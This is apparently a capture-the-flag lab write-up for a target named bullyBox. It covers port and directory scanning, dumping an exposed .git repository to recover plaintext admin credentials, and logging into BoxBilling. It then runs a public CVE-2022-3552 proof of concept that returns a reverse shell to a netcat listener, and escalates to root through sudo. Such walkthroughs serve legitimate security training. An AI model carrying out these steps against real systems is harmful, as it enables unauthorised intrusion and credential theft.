# CTF Writeup: bullyBox

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.196.27
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-27 04:12 EST
Nmap scan report for 192.168.196.27
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   36.60 ms 192.168.45.1
2   36.49 ms 192.168.45.254
3   36.70 ms 192.168.251.1
4   36.86 ms 192.168.196.27

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.90 seconds
```

When trying to access the target on the browser we immediatly get forwarded onto an domain called "bully.box.local", let's add it in our local /etc/hosts file.

```
sudo echo "192.168.196.27 bullybox.local" | sudo tee -a /etc/hosts
192.168.196.27 bullybox.local
```

The webpage itself seems to be running the "Box Billing" Application.

Enumerated endpoints on the webpage.

```
dirsearch -u http://bullybox.local                 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_bullybox.local/_25-12-27_04-20-52.txt

Target: http://bullybox.local/

[04:20:52] Starting: 
[04:21:55] 403 -  279B  - /js.bak                                           
[04:21:57] 403 -  279B  - /jsp.bak                                          
[04:21:57] 200 -    1KB - /%2e%2e;/test
[04:21:57] 403 -  279B  - /aspx.bak
[04:21:57] 403 -  279B  - /html.bak                                         
[04:21:57] 200 -    1KB - /%C0%AE%C0%AE%C0%AF
[04:21:57] 403 -  279B  - /php.bak
[04:22:02] 200 -    1KB - /%ff                                              
[04:22:04] 200 -    1KB - /..;/                                             
[04:22:09] 200 -    1KB - /.0                                               
[04:22:16] 403 -  279B  - /.badsegment.log                                  
[04:22:16] 403 -  279B  - /.bak                                             
[04:22:18] 403 -  279B  - /.badarg.log                                      
[04:22:19] 403 -  279B  - /.bak_0.log                                       
[04:22:44] 403 -  279B  - /.cc-ban.txt.bak                                  
[04:23:21] 403 -  279B  - /.divzero.log                                      
[04:23:21] 403 -  279B  - /.dep.inc
[04:23:40] 403 -  279B  - /.exit.log                                         
[04:23:40] 403 -  279B  - /.faultreadkernel.log                              
[04:23:41] 403 -  279B  - /.faultread.log                                    
[04:23:42] 403 -  279B  - /.forktest.log                                     
[04:23:42] 301 -  315B  - /.git  ->  http://bullybox.local/.git/             
[04:23:43] 403 -  279B  - /.git/                                             
[04:23:43] 200 -   92B  - /.git/config                                       
[04:23:43] 403 -  279B  - /.git/branches/
[04:23:43] 200 -   17B  - /.git/COMMIT_EDITMSG
[04:23:43] 403 -  279B  - /.git/info/                                        
[04:23:43] 200 -  240B  - /.git/info/exclude
[04:23:43] 200 -  162B  - /.git/logs/HEAD                                    
[04:23:43] 403 -  279B  - /.git/logs/
[04:23:43] 200 -  162B  - /.git/logs/refs/heads/master
[04:23:43] 301 -  331B  - /.git/logs/refs/heads  ->  http://bullybox.local/.git/logs/refs/heads/
[04:23:43] 403 -  279B  - /.git/refs/                                        
[04:23:43] 301 -  325B  - /.git/logs/refs  ->  http://bullybox.local/.git/logs/refs/
[04:23:43] 403 -  279B  - /.git/objects/                                     
[04:23:43] 301 -  326B  - /.git/refs/heads  ->  http://bullybox.local/.git/refs/heads/
[04:23:43] 200 -  484KB - /.git/index
[04:23:43] 200 -   41B  - /.git/refs/heads/master
[04:23:43] 301 -  325B  - /.git/refs/tags  ->  http://bullybox.local/.git/refs/tags/
[04:23:43] 403 -  279B  - /.forktree.log                                     
[04:23:43] 200 -   73B  - /.git/description                                  
[04:23:43] 200 -   23B  - /.git/HEAD                                         
[04:23:43] 403 -  279B  - /.git/hooks/                                       
[04:24:03] 403 -  279B  - /_config.inc                                       
[04:24:06] 200 -    2KB - /about-us                                          
[04:24:07] 403 -  279B  - /access.log                                        
[04:24:07] 403 -  279B  - /access_.log                                       
[04:24:09] 403 -  279B  - /accounts.sql                                      
[04:24:10] 403 -  279B  - /activity.log                                      
[04:24:13] 403 -  279B  - /admin%20/                                         
[04:24:38] 403 -  279B  - /adovbs.inc                                        
[04:24:39] 403 -  279B  - /affiliates.sql                                    
[04:24:39] 403 -  279B  - /akeeba.backend.log                                
[04:24:40] 200 -   77B  - /api/_swagger_/                                    
[04:24:40] 200 -   78B  - /api/2/explore/
[04:24:40] 200 -   66B  - /api/
[04:24:40] 403 -  279B  - /api.log
[04:24:40] 200 -   79B  - /api/__swagger__/
[04:24:40] 200 -   71B  - /api/2/issue/createmeta
[04:24:40] 200 -   82B  - /api/application.wadl
[04:24:40] 200 -   87B  - /api/apidocs/swagger.json
[04:24:40] 200 -   70B  - /api/docs
[04:24:40] 200 -   69B  - /api/api
[04:24:40] 200 -   71B  - /api/batch                                         
[04:24:40] 200 -   75B  - /api/error_log
[04:24:40] 200 -   73B  - /api/apidocs
[04:24:40] 200 -   74B  - /api/api-docs
[04:24:40] 200 -   79B  - /api/cask/graphql
[04:24:40] 200 -   72B  - /api/config
[04:24:40] 200 -   72B  - /api/docs/                                   
[04:24:46] 200 -    1KB - /bb-admin/admin                                    
[04:24:46] 302 -    0B  - /bb-admin  ->  http://bullybox.local/bb-admin/staff/login
[04:24:46] 200 -    1KB - /bb-admin/admin.php                                
[04:24:46] 200 -    1KB - /bb-admin/index.aspx
[04:24:46] 200 -    1KB - /bb-admin/admin.aspx
[04:24:46] 200 -    1KB - /bb-admin/index.jsp
[04:24:46] 200 -    1KB - /bb-admin/admin.js
[04:24:46] 200 -    1KB - /bb-admin/index.php
[04:24:46] 200 -    1KB - /bb-admin/admin.jsp
[04:24:46] 200 -    1KB - /bb-admin/index.html
[04:24:46] 200 -    1KB - /bb-admin/admin.html
[04:24:46] 302 -    0B  - /bb-admin/  ->  http://bullybox.local/bb-admin/staff/login
[04:24:46] 200 -    1KB - /bb-admin/login                                    
[04:24:46] 200 -    1KB - /bb-admin/index.js                                 
[04:24:46] 200 -    1KB - /bb-admin/login.php                                
[04:24:46] 200 -    1KB - /bb-admin/login.jsp
[04:24:46] 200 -    1KB - /bb-admin/login.js
[04:24:46] 200 -    1KB - /bb-admin/login.aspx
[04:24:46] 200 -    1KB - /bb-admin/login.html
[04:24:48] 200 -   82B  - /api/swagger/swagger                               
[04:24:48] 403 -  279B  - /bitrix_server_test.log                            
[04:24:48] 200 -    2KB - /blog                                              
[04:24:48] 200 -    1KB - /blog/fckeditor                                    
[04:24:48] 200 -    1KB - /blog/wp-login                                     
[04:24:49] 403 -  279B  - /buck.sql                                          
[04:24:49] 403 -  279B  - /build.log
[04:24:49] 403 -  279B  - /build.sh
[04:24:49] 403 -  279B  - /build_config_private.ini                          
[04:24:51] 200 -    2KB - /cart                                              
[04:24:51] 403 -  279B  - /ccbill.log                                        
[04:24:53] 403 -  279B  - /change.log                                        
[04:24:53] 403 -  279B  - /CHANGELOG.log                                     
[04:24:53] 200 -   24KB - /CHANGELOG.md                                      
[04:24:54] 403 -  279B  - /cleanup.log                                       
[04:24:54] 302 -    4KB - /client  ->  http://bullybox.local/login           
[04:24:54] 403 -  279B  - /clients.sql                                       
[04:24:56] 403 -  279B  - /common.inc                                        
[04:25:02] 403 -  279B  - /customers.log                                     
[04:25:02] 403 -  279B  - /customers.sql
[04:25:02] 302 -   13KB - /dashboard  ->  http://bullybox.local/login        
[04:25:08] 403 -  279B  - /dump.log
[04:25:09] 302 -    9KB - /email  ->  http://bullybox.local/login            
[04:25:10] 403 -  279B  - /env.bak/                                          
[04:25:10] 403 -  279B  - /err.log                                           
[04:25:10] 403 -  279B  - /error.ini                                         
[04:25:10] 403 -  279B  - /error.log                                         
[04:25:10] 403 -  279B  - /errors.log                                        
[04:25:11] 403 -  279B  - /etcd-events.log                                   
[04:25:11] 403 -  279B  - /etcd.log
[04:25:11] 403 -  279B  - /eudora.ini
[04:25:11] 200 -    1KB - /example                                           
[04:25:11] 403 -  279B  - /exception.log
[04:25:15] 403 -  279B  - /firebase-debug.log                                
[04:25:15] 403 -  279B  - /flashFXP.ini                                      
[04:25:15] 403 -  279B  - /forum.sql                                         
[04:25:16] 200 -    2KB - /forum                                             
[04:25:16] 403 -  279B  - /frontpg.ini                                       
[04:25:18] 403 -  279B  - /global.asax.bak                                   
[04:25:18] 403 -  279B  - /globals.inc                                       
[04:25:18] 403 -  279B  - /global.asa.bak
[04:25:21] 403 -  279B  - /hs_err_pid.log                                    
[04:25:21] 403 -  279B  - /htaccess.bak                                      
[04:25:21] 403 -  279B  - /htpasswd.bak                                      
[04:25:21] 403 -  279B  - /httpd.ini                                         
[04:25:21] 403 -  279B  - /http_access.log                                   
[04:25:24] 403 -  279B  - /import_error.log                                  
[04:25:25] 403 -  279B  - /index.bak                                         
[04:25:25] 403 -  279B  - /index.inc                                         
[04:25:25] 403 -  279B  - /index.php.bak                                     
[04:25:25] 403 -  279B  - /index1.bak
[04:25:25] 403 -  279B  - /index2.bak
[04:25:26] 403 -  279B  - /install.bak                                       
[04:25:26] 403 -  279B  - /install.inc
[04:25:26] 403 -  279B  - /install.log                                       
[04:25:26] 403 -  279B  - /install.sql                                       
[04:25:27] 403 -  279B  - /install_mgr.log                                   
[04:25:30] 403 -  279B  - /kube-proxy.log                                    
[04:25:30] 403 -  279B  - /kube-controller-manager.log
[04:25:30] 403 -  279B  - /krb.log                                           
[04:25:30] 403 -  279B  - /kube-apiserver.log
[04:25:30] 403 -  279B  - /kube-scheduler.log                                
[04:25:32] 403 -  279B  - /librepag.log                                      
[04:25:32] 200 -   11KB - /LICENSE
[04:25:32] 403 -  279B  - /liferay.log                                       
[04:25:32] 403 -  279B  - /lighttpd.access.log                               
[04:25:32] 403 -  279B  - /lighttpd.error.log                                
[04:25:32] 403 -  279B  - /listener.log                                      
[04:25:32] 403 -  279B  - /local_conf.php.bak                                
[04:25:33] 403 -  279B  - /localhost.sql
[04:25:33] 403 -  279B  - /localsettings.php.bak                             
[04:25:34] 200 -    3KB - /login                                             
[04:25:34] 403 -  279B  - /login.wdm%20                                      
[04:25:36] 403 -  279B  - /ltmain.sh                                         
[04:25:36] 403 -  279B  - /mail.log                                          
[04:25:37] 403 -  279B  - /maintenance.flag.bak                              
[04:25:37] 403 -  279B  - /MANIFEST.bak                                      
[04:25:39] 403 -  279B  - /members.log                                       
[04:25:40] 403 -  279B  - /members.sql                                       
[04:25:40] 403 -  279B  - /mercurial.ini                                     
[04:25:44] 403 -  279B  - /mysql.sql                                         
[04:25:44] 403 -  279B  - /mysql.log
[04:25:44] 403 -  279B  - /mysql_debug.sql                                   
[04:25:44] 403 -  279B  - /mysqldump.sql                                     
[04:25:44] 403 -  279B  - /native_stdout.log
[04:25:44] 403 -  279B  - /native_stderr.log
[04:25:45] 403 -  279B  - /New%20Folder                                      
[04:25:45] 403 -  279B  - /New%20folder%20(2)
[04:25:45] 200 -    2KB - /news                                              
[04:25:45] 403 -  279B  - /nginx-access.log                                  
[04:25:45] 403 -  279B  - /nginx-error.log
[04:25:45] 403 -  279B  - /nginx-ssl.access.log
[04:25:45] 403 -  279B  - /nginx-ssl.error.log
[04:25:46] 403 -  279B  - /npm-debug.log                                     
[04:25:48] 200 -    3KB - /order                                             
[04:25:49] 403 -  279B  - /order.log                                         
[04:25:49] 403 -  279B  - /orders.sql
[04:25:49] 403 -  279B  - /orders.log                                        
[04:25:50] 403 -  279B  - /passwd.bak                                        
[04:25:50] 403 -  279B  - /password.log                                      
[04:25:51] 403 -  279B  - /payment.log                                       
[04:25:51] 403 -  279B  - /payment_paypal_express.log                        
[04:25:51] 403 -  279B  - /payment_authorizenet.log
[04:25:51] 403 -  279B  - /PharoDebug.log                                    
[04:25:51] 403 -  279B  - /pgadmin.log                                       
[04:25:52] 403 -  279B  - /php-error.log                                     
[04:25:52] 403 -  279B  - /php-cli.ini
[04:25:52] 403 -  279B  - /php-errors.log
[04:25:52] 403 -  279B  - /php.ini                                           
[04:25:52] 403 -  279B  - /php4.ini                                          
[04:25:52] 403 -  279B  - /php_cli_errors.log                                
[04:25:52] 403 -  279B  - /php5.ini
[04:25:52] 403 -  279B  - /phperrors.log
[04:25:52] 403 -  279B  - /php.log
[04:25:52] 403 -  279B  - /php_error.log
[04:25:52] 403 -  279B  - /php_errors.log
[04:25:53] 403 -  279B  - /phpliteadmin%202.php                              
[04:25:53] 403 -  279B  - /phpini.bak
[04:25:58] 403 -  279B  - /plugins.log                                       
[04:26:02] 403 -  279B  - /production.log                                    
[04:26:02] 403 -  279B  - /propel.ini                                        
[04:26:02] 403 -  279B  - /proxy.ini                                         
[04:26:03] 403 -  279B  - /query.log                                         
[04:26:04] 403 -  279B  - /Read%20Me.txt                                     
[04:26:04] 200 -   10KB - /README.md                                         
[04:26:05] 403 -  279B  - /request.log                                       
[04:26:07] 403 -  279B  - /revision.inc                                      
[04:26:07] 200 -  357B  - /robots.txt                                        
[04:26:07] 403 -  279B  - /run.sh                                            
[04:26:07] 403 -  279B  - /sales.sql                                         
[04:26:07] 403 -  279B  - /sales.log
[04:26:08] 403 -  279B  - /schema.sql                                        
[04:26:09] 403 -  279B  - /secring.bak                                       
[04:26:09] 403 -  279B  - /sentemails.log                                    
[04:26:09] 403 -  279B  - /server-status
[04:26:09] 403 -  279B  - /server-status/
[04:26:10] 403 -  279B  - /serv-u.ini                                        
[04:26:10] 403 -  279B  - /serverStatus.log                                  
[04:26:10] 403 -  279B  - /server.log
[04:26:10] 302 -    9KB - /service  ->  http://bullybox.local/login          
[04:26:10] 302 -    9KB - /service?Wsdl  ->  http://bullybox.local/login     
[04:26:11] 403 -  279B  - /settings.php.bak                                  
[04:26:11] 403 -  279B  - /setup.log                                         
[04:26:11] 403 -  279B  - /setup.sql                                         
[04:26:11] 403 -  279B  - /shell.sh                                          
[04:26:13] 403 -  279B  - /site.sql                                          
[04:26:14] 200 -  360B  - /sitemap.xml                                       
[04:26:14] 403 -  279B  - /sites.ini
[04:26:15] 403 -  279B  - /spamlog.log                                       
[04:26:16] 403 -  279B  - /sql.sql                                           
[04:26:16] 403 -  279B  - /sql.inc
[04:26:16] 403 -  279B  - /sql_error.log                                     
[04:26:16] 403 -  279B  - /sqldump.sql
[04:26:16] 403 -  279B  - /sqlnet.log                                        
[04:26:17] 403 -  279B  - /SqueakDebug.log                                   
[04:26:17] 403 -  279B  - /stacktrace.log                                    
[04:26:17] 403 -  279B  - /startServer.log                                   
[04:26:17] 403 -  279B  - /start.sh                                          
[04:26:17] 403 -  279B  - /startup.sh                                        
[04:26:19] 403 -  279B  - /sugarcrm.log                                      
[04:26:19] 302 -   11KB - /support  ->  http://bullybox.local/login          
[04:26:21] 403 -  279B  - /syncNode.log                                      
[04:26:21] 403 -  279B  - /system.log                                        
[04:26:21] 403 -  279B  - /SystemErr.log                                     
[04:26:21] 403 -  279B  - /SystemOut.log                                     
[04:26:23] 403 -  279B  - /telphin.log                                       
[04:26:23] 403 -  279B  - /temp.sql                                          
[04:26:26] 403 -  279B  - /translate.sql                                     
[04:26:31] 403 -  279B  - /users.log                                         
[04:26:31] 403 -  279B  - /users.ini
[04:26:31] 403 -  279B  - /users.sql
[04:26:31] 403 -  279B  - /uwsgi.ini                                         
[04:26:33] 403 -  279B  - /vb.sql                                            
[04:26:33] 403 -  279B  - /venv.bak/                                         
[04:26:34] 403 -  279B  - /wcx_ftp.ini                                       
[04:26:37] 403 -  279B  - /web.config.bak                                    
[04:26:37] 403 -  279B  - /web.sql                                           
[04:26:40] 403 -  279B  - /wp-config.inc                                     
[04:26:40] 403 -  279B  - /wp-config.bak
[04:26:40] 403 -  279B  - /wp-app.log
[04:26:40] 403 -  279B  - /wp-config.php.bak                                 
[04:26:40] 403 -  279B  - /wp-config.php.inc                                 
[04:26:42] 403 -  279B  - /ws_ftp.ini                                        
[04:26:42] 403 -  279B  - /WS_FTP.log
[04:26:42] 403 -  279B  - /www-error.log                                     
[04:26:42] 403 -  279B  - /www.sql                                           
[04:26:42] 403 -  279B  - /wwwroot.sql                                       
[04:26:43] 403 -  279B  - /yaml.log                                          
[04:26:43] 403 -  279B  - /xphperrors.log
[04:26:43] 403 -  279B  - /yaml_cron.log                                     
[04:26:43] 403 -  279B  - /yarn-debug.log
[04:26:43] 403 -  279B  - /yarn-error.log                                    
[04:26:43] 403 -  279B  - /yum.log                                           
[04:26:43] 200 -    1KB - /~/                                                
                                                                              
Task Completed
```

The Results were very promising, we enumerated an /.git repository, an /api endpoint & also an /bb-admin endpoint, which provided us with an login panel.

## Vulnerability Assessment

Searching up for CVE's for the BoxBilling Application.

```
searchsploit BoxBilling                                           
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
BoxBilling 3.6.11 - 'mod_notification' Persistent Cross-Site Scripting                                      | php/webapps/30083.txt
BoxBilling<=4.22.1.5 - Remote Code Execution (RCE)                                                          | php/webapps/51108.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Downloaded the RCE Exploit.

When authenticated within the BoxBilling CMS --> /bb-admin endpoint. We are able to run the exploit by triggering an order request to the api endpoint and embedding an RCE script into the http request.

When accessing the /bb-admin endpoint, we verify the "BoxBilling 4.22.1.5" version.

Which means the current version is vulnerable to the RCE Exploit.

Upon trying to login, we get an Error "Rate Limit Reached".

Downloaded the git repository discovered previously onto my local machine.

```
it-dumper http://bullybox.local/.git git
[-] Testing http://bullybox.local/.git/HEAD [200]
[-] Testing http://bullybox.local/.git/ [403]
[-] Fetching common files
[-] Fetching http://bullybox.local/.git/COMMIT_EDITMSG [200]
[-] Fetching http://bullybox.local/.git/description [200]
[-] Fetching http://bullybox.local/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/post-commit.sample [404]
[-] http://bullybox.local/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://bullybox.local/.gitignore [404]
[-] http://bullybox.local/.gitignore responded with status code 404
[-] Fetching http://bullybox.local/.git/hooks/commit-msg.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/post-update.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/pre-commit.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/post-receive.sample [404]
[-] http://bullybox.local/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://bullybox.local/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/pre-push.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/update.sample [200]
[-] Fetching http://bullybox.local/.git/index [200]
[-] Fetching http://bullybox.local/.git/info/exclude [200]
[-] Fetching http://bullybox.local/.git/objects/info/packs [404]
[-] http://bullybox.local/.git/objects/info/packs responded with status code 404
[-] Fetching http://bullybox.local/.git/hooks/pre-receive.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/prepare-commit-msg.sample [200]
[-] Finding refs/
[-] Fetching http://bullybox.local/.git/HEAD [200]
[-] Fetching http://bullybox.local/.git/config [200]
[-] Fetching http://bullybox.local/.git/logs/HEAD [200]
[-] Fetching http://bullybox.local/.git/logs/refs/heads/master [200]
```

## Initial Access

Retrieved credentials, potentially for the /bb-admin endpoint.

```
array (
    'type' => 'mysql',
    'host' => 'localhost',
    'name' => 'boxbilling',
    'user' => 'admin',
    'password' => 'Playing-Unstylish7-Provided',

```

Logged in successfully with

```
admin@bullybox.local:Playing-Unstylish7-Provided
```

Since we now got login credentials. We can leverage the RCE exploit.

The Exploit didn't work, I tried to search up another exploit and found the following PoC:

```
git clone https://github.com/0xk4b1r/CVE-2022-3552.git
```

I then modified the exploit to fit my local machine ip and port 80.

Started up my listener on port 80.

```
nc -lvnp 80
```

Ran the exploit.

```
python3 CVE-2022-3552.py -d http://bullybox.local -u 'admin@bullybox.local' -p 'Playing-Unstylish7-Provided'
[+] Successfully logged in
[+] Payload saved successfully
[+] Getting Shell
```

Gained RCE as user "yuki".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.196.27] 45140
Linux bullybox 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 11:03:29 up  1:24,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
/bin/sh: 0: can't access tty; job control turned off
$
```

## Privilege Escalation

I identified that yuki is part of the sudo group.

```
yuki@bullybox:/$ id
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
```

Which means we can just login into root.

```
yuki@bullybox:/home/yuki$ sudo su
root@bullybox:/home/yuki#
```

Retrieved proof.txt in /root directory.

```
ce0251ff800e9f37b084dd1c05dee798
```
